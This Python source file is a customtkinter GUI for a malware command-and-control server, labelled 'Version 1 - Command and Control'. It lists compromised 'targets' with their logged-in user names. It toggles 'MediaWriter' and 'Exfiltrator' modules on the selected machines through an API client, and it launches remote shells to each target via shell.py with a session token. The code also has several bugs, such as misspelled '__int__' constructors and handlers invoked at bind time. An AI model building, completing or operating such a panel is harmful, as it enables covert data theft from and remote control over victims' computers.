import os
import sys
import time

import customtkinter as ctk
import webbrowser
import httpclient
import threading

from tkinter import messagebox
from PIL import Image, ImageTk


class CoreActionsFrame(ctk.CTkFrame):
    def __int__(self, master):
        ctk.CTkFrame.__init__(self, master)

        self.columnconfigure(0, weight=1)
        self.columnconfigure(1, weight=1)
        self.rowconfigure(0, weight=1)
        self.rowconfigure(1, weight=1)
        self.rowconfigure(2, weight=1)


class ActionsFrame(ctk.CTkFrame):
    def __init__(self, master):
        ctk.CTkFrame.__init__(self, master, fg_color="transparent")

        self.rowconfigure(0, weight=1)
        self.rowconfigure(1, weight=1)
        self.rowconfigure(2, weight=1)
        self.columnconfigure(0, weight=1)


class TimeoutFrame(ctk.CTkFrame):
    def __init__(self, master):
        ctk.CTkFrame.__init__(self, master, fg_color="transparent")

        self.columnconfigure(0, weight=1)
        self.columnconfigure(1, weight=1)
        self.rowconfigure(0, weight=1)
        self.rowconfigure(1, weight=1)


class HelperActionsFrame(ctk.CTkFrame):
    def __init__(self, master):
        ctk.CTkFrame.__init__(self, master, fg_color="transparent")

        self.columnconfigure(0, weight=1)
        self.columnconfigure(1, weight=1)


class TargetsFrame(ctk.CTkScrollableFrame):
    def __int__(self, master):
        ctk.CTkFrame.__init__(self, master)

        self.columnconfigure(0, weight=1)
        self.columnconfigure(1, weight=1)
        self.columnconfigure(2, weight=1)


class AdminPanel:
    def __init__(self, session_token, api_url):
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("themes/lizard.json")

        self.httpClient = httpclient.HttpClient(api_url)
        self.session_token = session_token
        self.api_url = api_url
        self._job = None
        self.modules = ["MediaWriter", "Exfiltrator"]
        self.supported_terminals = ["cmd", "qterminal"]

        self.window = ctk.CTk()
        self.window.title("Version 1 - Command and Control")
        self.window.geometry("700x400")
        self.window.eval("tk::PlaceWindow . Center")
        self.window.resizable(False, False)
        self.window.config(bg="#292b2f")

        self.window.columnconfigure(0, weight=1)
        self.window.columnconfigure(1, weight=1)
        self.window.rowconfigure(0, weight=2)
        self.window.rowconfigure(1, weight=1)
        self.window.rowconfigure(2, weight=1)

        self.image = Image.open("images/logo-green.png")
        self.logo = ImageTk.PhotoImage(self.image.resize((52, 52)))
        self.logo_holder = ctk.CTkLabel(self.window, text="  VERSION-1", image=self.logo, font=("Arial", 20, "bold"),
                                        compound=ctk.LEFT)
        self.logo_holder.grid(row=0, column=0, padx=(20, 0), sticky="w")

        self.targets_frame = TargetsFrame(self.window, orientation="vertical")
        self.targets_frame.grid(row=1, column=0)

        self.target_id = ctk.CTkCheckBox(self.targets_frame, text="target_id")
        self.target_id.grid(row=0, column=0, padx=10, pady=10)
        self.loginuser = ctk.CTkLabel(self.targets_frame, text="loggedin_user")
        self.loginuser.grid(row=0, column=1, padx=10, pady=10)

        self.actions_frame = ActionsFrame(self.window)
        self.actions_frame.grid(row=1, column=1)

        self.timeout_frame = TimeoutFrame(self.actions_frame)
        self.timeout_frame.grid(row=0, column=0)

        self.timeout_lbl = ctk.CTkLabel(self.timeout_frame, text="0", fg_color="white", font=("Arial", 10, "bold"),
                                        corner_radius=3, width=15, height=15, text_color="black",)
        self.timeout_lbl.grid(row=0, column=0)
        self.timeout_slider = ctk.CTkSlider(self.timeout_frame, from_=10, to=60, number_of_steps=5)
        self.timeout_slider.grid(row=1, column=0, pady=(0, 5))
        self.timeout_update_btn = ctk.CTkButton(self.timeout_frame, text="Set Timeout", fg_color="transparent", border_width=2,
                                                border_color="#306844", text_color="#306844", width=35, corner_radius=20,
                                                hover_color="white", command=self.update_timeout)
        self.timeout_update_btn.grid(row=1, column=1, padx=5, pady=10)

        self.core_actions_frame = CoreActionsFrame(self.actions_frame)
        self.core_actions_frame.grid(row=1, column=0, pady=20)

        self.selected_module = ctk.StringVar()
        self.selected_module.set("MediaWriter")
        self.modules_dropdown = ctk.CTkOptionMenu(self.core_actions_frame, values=self.modules, variable=self.selected_module)
        self.modules_dropdown.grid(row=0, column=0, columnspan=2, padx=5, pady=5, sticky="w")

        self.stop_btn = ctk.CTkButton(self.core_actions_frame, text="Stop")
        self.stop_btn.grid(row=1, column=0, padx=5, pady=5)
        self.start_btn = ctk.CTkButton(self.core_actions_frame, text="Start")
        self.start_btn.grid(row=1, column=1, padx=5, pady=5)

        self.default_terminal = ctk.StringVar()
        self.default_terminal.set("cmd")
        self.default_terminal_menu = ctk.CTkOptionMenu(self.core_actions_frame, values=self.supported_terminals,
                                                       variable=self.default_terminal)
        self.default_terminal_menu.grid(row=2, column=0)

        self.play_icon = ImageTk.PhotoImage((Image.open("images/play-icon.png")).resize((16, 16)))
        self.shell_btn = ctk.CTkButton(self.core_actions_frame, text="Run", command=self.start_shell, image=self.play_icon,
                                       width=24, height=24, fg_color="transparent")
        self.shell_btn.grid(row=2, column=1, padx=5, pady=5, sticky="w")

        self.helper_actions_frame = HelperActionsFrame(self.actions_frame)
        self.helper_actions_frame.grid(row=2, column=0, pady=20)

        self.refresh_targets_btn = ctk.CTkButton(self.helper_actions_frame, text="Refresh Targets", text_color="#151515",
                                                 fg_color="#FFCC00", hover_color="#DAB000", command=self.show_listeners)
        self.refresh_targets_btn.grid(row=0, column=0, sticky="w", padx=5)
        self.exit_btn = ctk.CTkButton(self.helper_actions_frame, text="Exit", fg_color="#FF2929", hover_color="#FF1919", command=self.terminate)
        self.exit_btn.grid(row=0, column=1, padx=5)

        self.credits = ctk.CTkLabel(self.window, text="Command icons created by Freepik - Flaticon")
        self.credits.grid(row=2, column=0, columnspan=2)

        self.timeout_slider.bind("<B2-Motion>", self.update_timeout())
        self.timeout_slider.bind("<Visibility>", lambda: self.timeout_lbl.configure(text=self.timeout_slider.get()))
        self.window.bind("<Visibility>", self.show_listeners())
        self.credits.bind("<Button-1>", lambda action: self.visit_credits("https://www.flaticon.com/free-icons/command"))
        self.stop_btn.bind("<Button-1>", lambda action: self.toggle_module(self.selected_module.get(), False))
        self.start_btn.bind("<Button-1>", lambda action: self.toggle_module(self.selected_module.get(), True))

        self.window.mainloop()

    def start_shell(self):
        try:
            targets = self.fetch_selected_targets()
            if not targets:
                messagebox.showinfo("No targets.", "No targets selected.")
                return

            for target in targets:
                match self.default_terminal.get():
                    case "cmd":
                        shell = threading.Thread(target=lambda: os.system(f"start cmd /c python shell.py -api {self.api_url} -sess-token {self.session_token} -target {target}"))
                        shell.start()

                    case "qterminal":
                        shell = threading.Thread(target=lambda: os.system(f"qterminal -e python shell.py -api {self.api_url} -sess-token {self.session_token} -target {target}"))
                        shell.start()

                    case _:
                        pass
        except Exception:
            messagebox.showerror("Unexpected error starting shell.py.")

    def show_listeners(self):
        self.clear_widgets(self.targets_frame)

        listeners = self.httpClient.api_get_listeners(self.session_token)
        if not listeners:
            empty_lbl = ctk.CTkLabel(self.targets_frame, text="No Targets Available.", font=("Arial", 15))
            empty_lbl.grid(row=0, column=0, columnspan=2, padx=10, pady=20)

        row_index = 0
        for listener in listeners:
            target_id = ctk.CTkCheckBox(self.targets_frame, text=listener["id"], font=("Arial", 13))
            target_id.grid(row=row_index, column=0, padx=10, pady=5)
            target_user = ctk.CTkLabel(self.targets_frame, text=listener["clientName"], font=("Arial", 13))
            target_user.grid(row=row_index, column=1, padx=10, pady=5)

            row_index += 1

    def show_timeout_value(self):
        if self._job:
            self.window.after_cancel(self._job)

        self._job = self.window.after(500, lambda: print("Timeout: ", self.timeout_slider.get()))

    def update_timeout(self):
        self.timeout_lbl.configure(text=self.timeout_slider.get())
        self.httpClient.std_timeout = int( self.timeout_slider.get() )

    def toggle_module(self, module_name, do_start):
        cmd = "start" if do_start else "stop"

        targets = self.fetch_selected_targets()
        if not targets:
            messagebox.showinfo("No targets.", "No targets selected.")
            
        threads = []
        threads_count = 0
        for target in targets:
            match module_name:
                case "MediaWriter":
                    cmd = f"{cmd} mediawriter"

                case "Exfiltrator":
                    cmd = f"{cmd} exfiltrator"

                case _:
                    continue

            while not threads_count <= 10:
                time.sleep(5)
                threads_count = self.check_cmd_threads(threads, threads_count)

            thread = threading.Thread(target=self.httpClient.api_submit_cmd,
                                      args=(self.session_token, target, False, cmd,))
            thread.start()
            threads.append(thread)

    def check_cmd_threads(self, threads, counter):
        for thread in threads:
            if not thread.is_alive():
                counter -= 1

        return counter

    def terminate(self):
        do_terminate = messagebox.askyesno("Confirm Exit", "Are you sure you want to exit?")

        if do_terminate:
            sys.exit()

    def clear_widgets(self, master):
        for widget in master.winfo_children():
            widget.destroy()

    def visit_credits(self, url):
        webbrowser.open(url)

    def fetch_selected_targets(self):
        targets = []
        for widget in self.targets_frame.winfo_children():
            if type(widget) is ctk.CTkCheckBox and widget.get():
                targets.append(widget._text)

        return targets

